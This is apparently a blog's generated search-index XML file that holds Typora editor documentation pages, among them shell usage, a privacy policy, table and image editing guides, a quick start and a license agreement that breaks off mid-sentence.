<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/12/03/algorithm-enhance/Typora/resources/app/style/themes/Readme/"/>
    <url>/2024/12/03/algorithm-enhance/Typora/resources/app/style/themes/Readme/</url>
    
    <content type="html"><![CDATA[<p>The built-in CSS will be replaced after update / reinstall, DO NOTMODIFY THEM.</p><p>Reffer https://support.typora.io/Add-Custom-CSS/ when you want tomodify those CSS. Reffer https://support.typora.io/About-Themes/ if youwant to create / install new themes.</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Use%20Typora%20From%20Shell%20or%20cmd/"/>
    <url>/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Use%20Typora%20From%20Shell%20or%20cmd/</url>
    
    <content type="html"><![CDATA[<h1 id="use-typora-from-shell-or-cmd">Use Typora From Shell or Cmd</h1><h2 id="macos">macOS</h2><p>You could use <code>open -a typora xxx.md</code> to open targetmarkdown in Typora. If Typora is your default editor for<code>.md</code> file, when <code>open xxx.md</code> would beenough.</p><p>You could also add</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">alias typora=&quot;open -a typora&quot;<br></code></pre></td></tr></table></figure><p>in your <code>.bash_profile</code> or other configuration file, thenyou would be able to do <code>typora xxx.md</code> to open the markdownfile from shell/terminal directly.</p><h2 id="windows">Windows</h2><p>If Typora is set as the default markdown editor, then in cmd.exe,input <code>.md</code> file path directly would open target markdownfile. For example: <code>./example.md</code>.</p><p>You would also add<code>&#123;typora-installed-folder&#125;/bin/typora.exe</code> into system Path,then you would be able to use <code>typora xxx.md</code> to openmarkdown file in Typora from command line. Usually,<code>&#123;typora-insatlled-folder&#125;</code> is<code>C:\Program Files (x86)\Typora</code>.</p><h2 id="linux">Linux</h2><p>After <a href="/Typora-on-Linux/">install typora on Linux</a>, usercould run <code>typora</code> directly in terminal, for example:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">typora ~/Document/test.md<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/More%20Documents/"/>
    <url>/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/More%20Documents/</url>
    
    <content type="html"><![CDATA[<h1 id="more-documents...">More Documents...</h1><p>See <a href="http://support.typora.io" class="uri">http://support.typora.io</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Privacy%20Policy/"/>
    <url>/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Privacy%20Policy/</url>
    
    <content type="html"><![CDATA[<h2 id="privacy-policy">Privacy Policy</h2><p><a href="http://typora.io">typora.io</a> built Typora as a Commercialsoftware. This SOFTWARE is provided by typora.io and is intended for useas is.</p><p>This page is used to inform users regarding our policies with thecollection, use, and disclosure of Personal Information if anyonedecided to use Typora.</p><p>If you choose to use Typora, then you agree to the collection and useof information in relation to this policy.</p><p>The terms used in this Privacy Policy have the same meanings as inour Terms and Conditions, which will be accessible at Typora unlessotherwise defined in this Privacy Policy.</p><p>This Privacy Policy only applies for the usage of our software.Visiting our official homepage, support website, theme website, or otherrelated websites, is not controlled by this Privacy Policy.</p><h3 id="information-collection-and-use">Information Collection andUse</h3><p><strong>Anonymous usage data will only be send when the option "SendAnonymous Usage Info" is enabled in preferences panel.</strong></p><p>If you disable the option, no data will be collected to us. (Theoption can be opt-out, but may need a restart of Typora for the optionto apply).</p><p>When you allow send anonymous usage data, we WILL collect followingdata anonymous for getting overall statistics of how Typora is used:</p><ul><li>Typora version, operation system, screen resolution, locale andcountries (based on IP address).</li><li>Name of operations when using Typora, such as “launch”, “newwindow”, “print”, etc, for gathering overall statistics. (We won’t beable to list all detailed operations for a given user. We won’t collectany detail or sensitive data for user’s operation)</li><li>How long a user is using Typora.</li><li>Insensitive preference settings in Typora such as theme name, windowstyle, etc.</li></ul><p>When error/exception happens, and if you allow send anonymous usagedata, we will collect stack trace, related settings, and running statusbefore exception throws to help us find errors. It should not containany sensitive or personal data.</p><h4 id="rd-party-apps-services">3rd Party Apps &amp; Services</h4><p>Typora can call and execute other apps for higher usability, whichmay collect information used to identify you, no matter you enable "SendAnonymous Usage Info" or not.</p><p>The 3rd party apps that Typora may launch includes:</p><ul><li><a href="https://en.toolinbox.net/iPic/">iPic</a> (optionalinstallation on macOS). It may be automatically launched by Typora whenyou choose to upload images into could server via iPic. Target imagepath or data will be provided to iPic from Typora during thisprocess.</li><li><a href="https://pandoc.org/">Pandoc</a> (optional installation). Itmay be automatically launched by Typora when you import/export docx,epub, LaTeX, and other file formats. Data of your current file will beprovided to Pandoc from Typora in a converted format that Pandocaccepts.</li></ul><p>None of them will be installed automatically by Typora, nor launchedautomatically when user is not doing related operations.</p><p>We have no control over and assume no responsibility for the content,privacy policies, or practices of any third-party services or apps.</p><h3 id="external-sites">External Sites</h3><p>If you insert images, videos, iframes or other resources Typorasupport from remote websites, or open local markdown file containingthem, Typora will load them automatically from target sites. Thosesites, however, may collect your visit information.</p><p>Also, you can input or open files that may contain links to othersites. If you click on a third-party link, you will be directed to thatsite. Note that these external sites are not operated by us. Therefore,we strongly advise you to review the Privacy Policy of thesewebsites.</p><p>We have no control over and assume no responsibility for the content,privacy policies, or practices of any third-party websites.</p><h3 id="log-data">Log Data</h3><p>Typora will record necessary log on your local computer.</p><h3 id="backups">Backups</h3><p>For better user experience and prevent data lose from crash, ifpossible, Typora will create backups for the content your input ormodify automatically, those backups are stored on your local computer,no data will be collected by us.</p><h3 id="feedbacks-debug-contents">Feedbacks &amp; Debug Contents</h3><p>You may send us, or we may suggest you to send us informations likesystem version, operation steps , sample markdown files, or other neededinfo when you reports bugs or gave feedbacks. You can refuse to providethose informations if you do not want to.</p><p>All sample markdown files that user send to us, will only be used fordebug and test purpose, we will not leak them to any other person who isnot one of our development team without user's permission. We may keepand use them after we remove sensitive data or personal identical data,for regulation test purpose. But we will delete files from mail box andlocal machine after we fixed related bugs, if user require us doingso.</p><p>Since user can give us feedbacks via mail, GitHub, twitter,doorbell.io, and so on, we have no control over and assume noresponsibility for the content, privacy policies, or practices of any ofthose communication tools.</p><h3 id="service-providers">Service Providers</h3><p>We will NOT share data with third-party companies andindividuals.</p><h3 id="security">Security</h3><p>We value your trust in providing us your Personal Information, thuswe are striving to use commercially acceptable means of protecting it.But remember that no method of transmission over the internet, or methodof electronic storage is 100% secure and reliable, and we cannotguarantee its absolute security.</p><h3 id="childrens-privacy">Children’s Privacy</h3><p>These Services do not address anyone under the age of 13. We do notknowingly collect personally identifiable information from childrenunder 13. In the case we discover that a child under 13 has provided uswith personal information, we immediately delete this from our serversor machines. If you are a parent or guardian and you are aware that yourchild has provided us with personal information, please contact me sothat we will be able to do necessary actions.</p><h3 id="changes-to-this-privacy-policy">Changes to This PrivacyPolicy</h3><p>We may update our Privacy Policy from time to time. Thus, you areadvised to review this file or page periodically for any changes. Thesechanges are effective immediately after they are updated in our websiteor Typora is upgraded.</p><h3 id="contact-us">Contact Us</h3><p>If you have any questions or suggestions about our Privacy Policy, donot hesitate to contact us (<a href="mailto:hi@typora.io" class="email">hi@typora.io</a>).</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Table%20Editing/"/>
    <url>/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Table%20Editing/</url>
    
    <content type="html"><![CDATA[<h1 id="edit-tables">Edit Tables</h1><ul><li>Outline {:toc} ## Tables in Markdown</li></ul><p>Typora supports table syntax of <a href="https://guides.github.com/features/mastering-markdown/">GithubFavored Markdown</a>:</p><p>It will parse following text in a markdown file into a table.</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gfm">|First Header | Second Header|<br>|------------ | -------------|<br>|Content from cell 1 | Content from cell 2|<br>|Content in the first column | Content in the second column|<br></code></pre></td></tr></table></figure></blockquote><h2 id="create-table-in-typora">Create Table in Typora</h2><p>To create a table in Typora, you could simplify write down a tableheader in markdown.</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">|First Header | Second Header|<br></code></pre></td></tr></table></figure><p>And then press <code>Return</code> key.</p><p>Also, you could also insert table from menubar.</p><p>A table must have table headers and at least one row and onecolumn.</p><h2 id="add-row-in-table">Add Row in Table</h2><p>Press <code>Command/Ctrl+Enter</code> to quickly insert an empty rowunder current table row. Context menu is also available for add rowaction.</p><h2 id="delete-row-in-table">Delete Row in Table</h2><p>The delete line command (<code>Shift+Command/Ctrl+L</code>) willdelete current table row in a table. Context menu is also available fordelete row action.</p><h2 id="adddelete-column-in-table">Add/Delete Column in Table</h2><p>Right click on a table cell, and in submenu of <code>table</code> incontext menu, there's menu items for add/remove table columns.</p><p>If you have a Mackbook with <strong>touchbar</strong>, you could alsouse buttons from touchbar for add/move/delete table row/column.</p><h2 id="resize-table">Resize Table</h2><p>Put the cursor inside a table and a table tooltip will show above thetable header. Click the most left icon, and you will be able to resizethe table like most rich editors.</p><p>If you want to make the table larger than 6 columns or 10 rows, youcould click the row/column number input and input a proper number.</p><figure><img src="/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Table%20Editing/table-edit.png" alt="table-edit"><figcaption aria-hidden="true">table-edit</figcaption></figure><h2 id="text-alignment-in-column">Text Alignment in Column</h2><p>In <a href="https://guides.github.com/features/mastering-markdown/">GithubFavored Markdown</a>, column alignment is configurable likefollowing:</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">| Default | Left  | Right | Center |<br>| ------- | :---- | ----: | :----: |<br>| cell1   | cell2 | cell3 | cell4  |<br></code></pre></td></tr></table></figure><p>In typora, you could simply change text alignment under a column byselecting related alignment icon from table tooltip.</p><p>With alignment set, Typora will add attribute like<code>style="text-align: left"</code> to affected column(<code>&lt;td&gt;</code>), but the final alignment can still be changedby CSS rules in current theme or custom CSS.</p><h2 id="move-rowcolumn">Move Row/Column</h2><p>Reorder row/column is also very easy thanks to Typora's WYSIWYGfeature. Just move you mouse on the left/top border of a row/column, anduse drag &amp; drop to render it:</p><h2 id="touchbar-support.">Touchbar Support.</h2><p>Tables can also be tweaked via MacBook touchbar.</p><figure><img src="/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Table%20Editing/Touch%20Bar%20Shot%202017-02-28%20at%2000.40.32.png" alt="Touch Bar Shot 2017-02-28 at 00.40.32"><figcaption aria-hidden="true">Touch Bar Shot 2017-02-28 at00.40.32</figcaption></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Quick%20Start/"/>
    <url>/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Quick%20Start/</url>
    
    <content type="html"><![CDATA[<h1 id="welcome">Welcome</h1><p>Thank you for choosing <strong>Typora</strong>. This document willhelp you to start Typora. Please note that Typora for Windows is stillin beta phase, so this document may be updated in futureversion-ups.</p><p>[TOC]</p><h2 id="live-preview">Live Preview</h2><p><strong>Typora</strong> use the feature: <em>Live Preview</em>,meaning that you could see these inline styles after you finish typing,and see block styles when you type or after you press <code>Enter</code>key or focus to another paragraph. Just try to type some markdown intypora, and you would see how it works.</p><p><strong>Note</strong>: Markdown tags for inline styles, such as<code>**</code> will be hidden or displayed smartly. Markdown tags forblock level styles, such as <code>###</code> or <code>- [x]</code> willbe hidden once the block is rendered.</p><p>You could switch to source code mode temporary from menu bar, footerbar or short cut key (<code>ctrl+/</code>). But we only provide verybasic support for source code mode and won't recommend users to doso.</p><h2 id="markdown-for-typora">Markdown For Typora</h2><p><strong>Typora</strong> is using <a href="https://help.github.com/articles/github-flavored-markdown/">GitHubFlavored Markdown</a> .</p><p>To see full markdown Syntax references and extra usage, please check<code>Help</code>-&gt;<code>Markdown Reference</code> in menu bar or<code>About</code> panel.</p><h2 id="shortcut-keys">Shortcut Keys</h2><p>You could find shortcut keys in the right side of menu items frommenu bar. For custom shortcut keys, please refer <a href="Custom-Key-Binding/">here</a>.</p><h2 id="copy">Copy</h2><p>We create typora and want to make it your default markdown editor,thus copy and paste means copy from another app or paste to another app,instead of <em>copy/paste from/to another markdown editor</em>.Therefore, by default, <code>Copy</code> means <code>Copy As HTML</code>( and <code>Paste</code> means <code>Paste from HTML</code>).</p><p>However, after click "<strong>Copy Markdown source bydefault</strong>", typora will copy selected text in HTML/markdownformat (When pasting, rich editors will accept the HTML format, whileplain text / code editor will accept the markdown source codeformat).</p><p>To <strong>copy Markdown source code</strong> explicitly, please useshortcut key <code>shift+cmd+c</code> or <code>Copy as Markdown</code>from menu. To <strong>Copy as HTML Code</strong>, please select<code>Copy as HTML Code</code> from menu.</p><h2 id="smart-paste">Smart Paste</h2><p><strong>Typora</strong> is able to analyze styles of the text contentin your clipboard when pasting. For example, after pasting a<code>&lt;h1&gt;HEADING&lt;/h1&gt;</code> from some website, typora willkeep the 'first level heading’ format instead of paste ‘heading’ asplain text.</p><p>To <strong>paste as markdown source</strong> or plain text, youshould use <code>paste as plain text</code> or press the shortcut key:<code>shift+cmd+v</code>.</p><h2 id="themes">Themes</h2><p>Please refer to <code>Help</code> → <code>Custom Themes</code> frommenu bar.</p><h2 id="publish">Publish</h2><p>Currently Typora only support to export as <strong>PDF</strong> or<strong>HTML</strong>. More data format support as import/export will beintegrated in future.</p><h2 id="auto-save-and-file-recovery">Auto Save and File Recovery</h2><p>Typora support auto save feature, user could enable it frompreference panel.</p><p>Typora does not provide professional version control and file backupfeature, but typora would backup the last file content from time to timeautomatically, so even when typora crashes or users forget to save thefile before close, it is possible to recovery most of the work byclicking <code>Recovery Unsaved Drafts</code> from preference folder,and copy out backed-up files. The File name in this folder is consistsof last saved date, originally file name and last saved timestamp.</p><h2 id="more-useful-tips-documents">More Useful Tips &amp;Documents</h2><p><a href="http://support.typora.io/" class="uri">http://support.typora.io/</a></p><h2 id="and-more">And More ?</h2><p>For more questions or feedbacks, please contact us by:</p><ul><li>Home Page: http://typora.io</li><li>Email: <a href="mailto:hi@typora.io" class="email">hi@typora.io</a></li><li>Twitter <a href="https://twitter.com/typora"><span class="citation" data-cites="typora">@typora</span></a></li></ul><p>We opened a Github issue page in case you want to start a discussionor as an alternative way to report bugs/suggestions:https://github.com/typora/typora-issues/issues</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Use%20Images%20in%20Typora/"/>
    <url>/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Use%20Images%20in%20Typora/</url>
    
    <content type="html"><![CDATA[<h1 id="use-images-in-typora">Use Images in Typora</h1><h2 id="images-in-markdown">Images in Markdown</h2><p>In markdown, image is written like <code>![alt](src)</code>. The<code>src</code> here can either be a url like<code>https://octodex.github.com/images/yaktocat.png</code>, or anabsolute/relative file path, like <code>../images/test.png</code>.</p><p>More Topics about Image:</p><p>[TOC]</p><h2 id="how-to-insert-images-in-typora">How to insert images inTypora</h2><h3 id="write-the-markdown">Write the Markdown</h3><p>You could simply write down the markdown syntax to insert the image.Or click "image" from menubar, or press the shortcut key. When you dothis, and meanwhile, if there is an image url in clipboard, then the urlwill be inserted into the <code>src</code> part directly.</p><h3 id="drag-drop">Drag &amp; Drop</h3><p>Of course, there's a easier way — drag &amp; drop, like thescreencast below.</p><figure><img src="/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Use%20Images%20in%20Typora/drag-img.gif" alt="drag-img"><figcaption aria-hidden="true">drag-img</figcaption></figure><p>You could also drag &amp; drop multiple image files at one time.</p><h3 id="select-from-local-files">Select from local files</h3><p>You could click menu item <code>Edit</code> →<code>Image Tools</code> → <code>Insert Local Images…</code> from menubar to open a dialog to select and insert local image(s).</p><p>If you use this menu item frequently, we would suggest you tore-assign the shortcut key for this "insert image" command following <a href="http://support.typora.io/Custom-Key-Binding/">Custom KeyBinding</a>.</p><h3 id="paste-images-from-clipboard">Paste images from clipboard</h3><p>Since Markdown file is only plain text file, users could not insertimage data into Markdown file directly, but can insert image referenceto file/url.</p><p>Typora support paste image data from clipboard, <strong>after tellingtypora where to put those images</strong>. Typora would put image datainto given folder or server, then insert images referring to that storedfile or url. Please refer to section <strong><a href="#when-insert-local-image...">When insert local image…</a></strong>for more detail.</p><blockquote><p><strong>Tips</strong>: on macOS, users could copy image file fromfinder and then paste into typora. It has same behavior with drag anddrop.</p><p><strong>Tips</strong>: on macOS, you could also copy images fromiPhone and then paste into Typora after setup the location to put imagefiles.</p></blockquote><h2 id="when-insert-local-image...">When insert local image...</h2><p>Typora support copying image files into given folder or web server(require <a href="https://itunes.apple.com/app/id1101244278?ls=1&amp;mt=12">iPic</a>)when insert local images using drag &amp; drop, or from menu bar.Following are instructions on the set-up.</p><h3 id="default-behaviors">Default behaviors</h3><p>By default, when you insert or drag &amp; drop a image file intoTypora, we will use the path of image file for attribute<code>src</code>.</p><h3 id="use-relative-path">Use Relative Path</h3><p>If you enable <code>Editor</code> → <code>Image Insert</code> →<code>Use relative path if possible</code> in preferences panel, andyour writing has been saved into a file, then when you drag &amp; drop alocal image, the <code>src</code> attribute will be set as its relativepath to current file (folder).</p><h3 id="copy-image-files-to-target-folder-when-insert-local-image">Copyimage files to target folder when insert local image</h3><blockquote><p>To use this feature, you need to opt-in the option<code>Allow copy images to given folder</code> in preferences panel.</p></blockquote><p>One common scenario is to edit <code>*.md</code> posts in staticsites (like Jekyll) using Typora. For example, if the <code>.*md</code>file is put under <code>_posts</code> folder while the image files goesinto <code>_media</code> folder, you may want to copy images files intofolder <code>_media</code> when you drag/drop or paste images intoMarkdown file automatically. Here's how:</p><ol type="1"><li><p>Save your file into some path.</p></li><li><p>Enable <code>Editor</code> → <code>Image Insert</code> →<code>Allow copy images to given folder</code> in preferences panel.</p><figure><img src="/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Use%20Images%20in%20Typora/Snip20161117_2.png" alt="Snip20161117_2"><figcaption aria-hidden="true">Snip20161117_2</figcaption></figure></li><li><p>Select <code>Edit</code> → <code>Image Tools</code> →<code>When Insert Local Images</code> →<code>Copy Image File to Folder</code> from menubar, pick the targetfolder.</p><figure><img src="/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Use%20Images%20in%20Typora/Snip20161117_6.png" alt="Snip20161117_6"><figcaption aria-hidden="true">Snip20161117_6</figcaption></figure></li></ol><p>In step 3, a new item<code>typora-copy-images-to: &#123;relative path&#125;</code> will be insertedinto the <a href="http://yaml.org/">YAML Front Matter</a> block ofcurrent document. So you could also manually add<strong>typora-copy-images-to</strong> property in YAML Front Matter toenable this behaviour.</p><p>After that, if you drag &amp; drop <strong>local</strong> images orpaste images into Typora, the image file will be copied into the targetfile and update related <code>src</code>.</p><h3 id="upload-image-file-to-web-server.-macos-only">Upload image fileto web server. (macOS only)</h3><blockquote><p><strong>Requirements</strong>: macOS ≥ 10.11 and <a href="https://itunes.apple.com/app/id1101244278?ls=1&amp;mt=12">iPic</a>to be installed. If you want to enable upload images automatically when<code>typora-copy-images-to: ipic</code> is set in YAML, option "Allowupload images automactially based on YAML settings" must be enabledfirst.</p><p><strong>Warning</strong>: By default, iPic will upload images to apublic web server anonymously, and you won't be able to delete imagefiles from that web server once you upload into it. So please configiPic in advance if you want to enable this feature and control all imagefiles you uploaded.</p></blockquote><p>Here's how to enable this function:</p><ol type="1"><li>Install <a href="https://itunes.apple.com/app/id1101244278?ls=1&amp;mt=12">iPic</a>and <strong>config</strong> a proper online image service.</li><li>Enable <code>Editor</code> → <code>Image Insert</code> →<code>Allow copy images to given folder</code> in preferencespanel.</li><li>Check item <code>Edit</code> → <code>Image Tools</code> →<code>When Insert Local Images</code> →<code>Upload Image via iPic</code> from menubar.</li></ol><p>In step 3, a new item <code>typora-copy-images-to: ipic</code> willbe inserted into the <a href="http://yaml.org/">YAML Front Matter</a>block of current document.</p><p>So you could also manually add <strong>typora-copy-images-to:ipic</strong> property in YAML Front Matter to enable thisbehaviour.</p><p>Tips: If you want to move image file to folder <code>ipic</code>, youshould use <code>typora-copy-images-to: ./ipic</code>.</p><h2 id="display-images-in-relative-path">Display images in relativepath</h2><h3 id="relative-path-to-current-filefolder-default-behavior">Relativepath to current file/folder (default behavior)</h3><p>By default, users could refer to local image by relative path tocurrent <code>*.md</code> file. For example, if the <code>*.md</code>file is at <code>/User/typora/desktop/test.md</code>, then the<code>![img](image.png)</code> will display image from<code>/User/typora/desktop/image.png</code> just like the<code>&lt;img&gt;</code> tag in HTML. Also, for<code>../download/image.png</code>, image from<code>/User/typora/download/image.png</code> will be fetched.</p><h3 id="relative-path-to-certain-folder">Relative path to certainfolder</h3><p>If you’re using markdown for building websites, you may specify a urlprefix for image preview in local computer with property<code>typora-root-url</code> in YAML Front Matters.</p><p>For example, input<code>typora-root-url:/User/Abner/Website/typora.io/</code> in YAMLFront Matters, and then <code>![alt](/blog/img/test.png)</code> will betreated as<code>![alt](file:///User/Abner/Website/typora.io/blog/img/test.png)</code>in typora.</p><p>In new version, instead of manually input<code>typora-root-url</code> property, you could just click item frommenubar <code>Edit</code> → <code>Image Tools</code> →<code>Use Image Root Path</code> to tell Typora to generate<code>typora-root-url</code> property automatically.</p><h2 id="upload-images-to-cloud-server-macos-only">Upload images to cloudserver (macOS only)</h2><h3 id="introduction-to-ipic">Introduction to iPic</h3><figure><img src="/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Use%20Images%20in%20Typora/ipic.jpg" alt="ipic"><figcaption aria-hidden="true">ipic</figcaption></figure><p><a href="https://itunes.apple.com/app/id1101244278?ls=1&amp;mt=12">iPic</a>is an app which allows you to upload local images into various cloudservice, including  <a href="http://imgur.com/">Imgur</a>, <a href="https://www.flickr.com/">Flickr</a>,<a href="https://aws.amazon.com/s3/">Amazon S3</a>, etc, and return you aweb url of the uploaded image for public access. You could find detaileddocuments <a href="http://toolinbox.net/en/iPic/">here</a>.</p><p>With the integration of <a href="https://itunes.apple.com/app/id1101244278?ls=1&amp;mt=12">iPic</a>,users could share markdown file to others without packaging local imagesalong with the plain text file. And users can stop caring about where toput local images or how to refer local images using relative path, sincethey can simply upload used images into cloud server.</p><h3 id="system-requirements-and-preparation">System requirements andpreparation</h3><ol type="1"><li>This feature only supports macOS ≥ 10.11.</li><li>Must install latest version of <a href="https://itunes.apple.com/app/id1101244278?ls=1&amp;mt=12">iPic</a>.</li><li>Configure web server in <a href="https://itunes.apple.com/app/id1101244278?ls=1&amp;mt=12">iPic</a>.</li></ol><h3 id="upload-all-local-images-to-cloud-server">Upload all local imagesto cloud server</h3><p>Typora provides a function to upload all local images to cloud servervia <a href="https://itunes.apple.com/app/id1101244278?ls=1&amp;mt=12">iPic</a>.To use it, simply, check <code>Edit</code> → <code>Image Tools</code> →<code>Upload Local Images via iPic</code> from menubar and wait for theuploading process to be finished.</p><h3 id="upload-when-inserting-images">Upload when inserting images</h3><p>How-tos for this part can be found in section <a href="#when-insert-local-image…">When insert local image…</a> → Uploadimage file to web server. (macOS only).</p><h2 id="align-images">Align images</h2><p>Currently Typora does not support image alignment. But you could useHTML code like <code>&lt;center&gt;![img](src)&lt;/center&gt;</code> toalign images on exported HTML or PDF.</p><p>Also, by default, if one paragraph only contains one image, it willbe center aligned. It is controlled by CSS, and can be reverted by <a href="http://support.typora.io/Add-Custom-CSS/">add custom CSS</a>:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> <span class="hljs-selector-class">.md-image</span><span class="hljs-selector-pseudo">:only-child</span>&#123;<br>    <span class="hljs-attribute">width</span>: auto;<br>    <span class="hljs-attribute">text-align</span>: inherit;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="resize-images">Resize images</h2><p>Please check <a href="http://support.typora.io/Resize-Image/">thislink</a>.</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/License%20Agreement/"/>
    <url>/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/License%20Agreement/</url>
    
    <content type="html"><![CDATA[<h1 id="end-user-license-agreement">End User License Agreement</h1><blockquote><p>Please read this End User License Agreement (a.k.a “EULA”, "LicenseAgreement") before You purchase a License Key for the Software andsubsequently download and use the Software.</p></blockquote><p>By purchasing a License Key and/or downloading and using theSoftware, You agree, without reservation, to be bound by the terms ofthis EULA. If You do not agree with the terms of this EULA, please donot purchase a License Key and/or download and use the Software.</p><p>If You accept the terms and conditions in this EULA on behalf of acompany or other legal entity, You warrant that You have full legalauthority to accept the terms and conditions in this EULA on behalf ofsuch company or other legal entity, and to legally bind such company orother legal entity.</p><p>You may not accept this EULA if You are not of legal age to form abinding contract in your country/states.</p><h2 id="definitions">1. Definitions</h2><ul><li>"<strong>We</strong>" a.k.a. "us", or "typora.io". Developer(s) ofTypora.</li><li><strong>“Documentation”</strong> the detailed information about theSoftware, its features and the system requirements as made available onthe website of typora.io, as amended from time to time.</li><li><strong>“Open Source Software”</strong> any software that requiresas a condition of use, copying, modification and/or distribution of suchsoftware that such software or other software incorporated into, derivedfrom or distributed with such software (a) be disclosed or distributedin source code form, and (b) be licensed for the purpose of makingand/or distributing derivative works, and (c) be redistributable at nocharge;</li><li><strong>“Beta version”</strong> the license for the Software forpublic testing. This is currently the only available version. You couldfind if current Typora is in beta version or not from "Help" -&gt;"About" dialog.</li><li><strong>“Stable version”</strong> versions with version number equalor greater than 1.0, exclude Beta versions.</li><li><strong>“Full version”</strong> the license for the Software for theterm specified on the webpage of the store where You purchase thelicense, or in any applicable agreement concerning the purchase of thelicense (as stand-alone product or as part of a subscription) to Use theSoftware. This license is when Typora reaches v1.0.</li><li><strong>“Trial version”</strong> the license for the Software forthe term of N days to Use the Stable version of Software for the solepurpose of testing and evaluating the Software. (N will be decided by usin future). This license is when Typora reaches v1.0.</li><li><strong>“Updates”</strong> any modified versions and updates of, andadditions to the Software (excluding upgrades of the Software);</li><li><strong>"Major Update"</strong> updates that introduce major versionnumber changes, for example, from 1.x to 2.x is a Major Update, from1.1.x to 1.2.x is not.</li><li><strong>“Use”</strong> the access, download, install, copy or getbenefit from using the Software in accordance with thedocumentation.</li><li><strong>“You”</strong> you, the final and ultimate user of theSoftware or the authorized representative of a company or other legalentity that will be the final and ultimate user of the Software, and thecompany or other legal entity that will be the final and ultimate userof the Software, if applicable.</li></ul><h3 id="general">General</h3><ol type="1"><li>This EULA applies to any licenses granted to You by us for the useof the Software.</li><li>By purchasing a License Key for the Software and/or downloading andusing the Software, You enter into this EULA with us.</li></ol><h2 id="changes-to-the-license-agreement-and-the-websiteproduct">2.Changes to the License Agreement and the Website/Product</h2><ol type="1"><li>Typora is a work in progress, meaning that a lot will change in thenear future. We reserve the right to update the Website and these Termsof Service from time to time, at our discretion. We will make sure toannounce any major change in a prominent way.</li><li><strong>Your continued use of the Typora following the publishing ofupdated License Agreement means that you accept and agree to thechanges.</strong></li><li>The published License Agreement not only applies to current betaversions, but also applies to all versions and future updates ofTypora.</li></ol><h2 id="license">3. License</h2><ol type="1"><li>We grant You a non-exclusive, non-transferable, limited, revocablelicense to Use the Software in accordance with this EULA. We reserve allrights not expressly granted to You.</li><li>We are and remain the owner of any intellectual property rights withrespect to the Software. You shall not acquire any ownership to theSoftware as result of Your purchase of the License Key or Your Use ofthe Software.</li></ol><h2 id="permitted-use-and-restrictions">4. Permitted use andrestrictions</h2><ol type="1"><li>In order to be able to install the Software and receive Updates andupgrades, Your computer shall have access to the Internet and shall meetthe system requirements described in the Documentation that can be foundon the webpage: https://support.typora.io/System-Requirements. Thesystem requirements may be changed in future updates.</li><li>You shall Use the Beta version, Full version, or Trial version inaccordance with applicable laws and shall not:<ol type="1"><li>Use the Trial version on any system where the Trial version waspreviously Used and expired;</li><li>rent, lease, lend, sell, redistribute, sublicense or otherwisecommercially exploit the License Key, the Full version or the Trialversion;</li><li>assign the License Key, the Full version or the Trial versionwithout prior written approval of us;</li><li>Use the Beta version, Full version or Trial version for any unlawfulor illegal activity, or to facilitate an unlawful or illegalactivity;</li><li>delete or alter any disclaimers, warnings, copyright or otherproprietary notices accompanying the Software; or</li><li>adapt (except as otherwise provided in this EULA), decompile,reverse engineer, disassemble, attempt to derive the source code of,modify or create derivative works of the Software and the License Key orany parts thereof, except to the extent permitted by applicablelaw.</li><li>Exception: repackage (provide installation packages/scripts) Typoraon Linux system is allowed if all contents (includes all binaries,resources files, scripts, etc) of Typora are not modified ordeleted.</li></ol></li><li>We may modify the Software at any time at its sole discretion andwithout notice to You, for example to comply with applicable law or acourt order, to avoid a third party infringement claim or to provideUpdates and upgrades.</li><li>Certain components of the Software are Open Source Software andlicensed under the terms of the applicable license(s) of the Open SourceSoftware. You shall adhere to these terms and conditions, which can befound via the webpage: http://support.typora.io/Acknowledgement/.</li></ol><h2 id="maintenance-and-support">5. Maintenance and support</h2><ol type="1"><li>We will notify You of any available Updates and upgrades.</li><li>You will be entitled to receive Updates free of charge for unless itis a Major 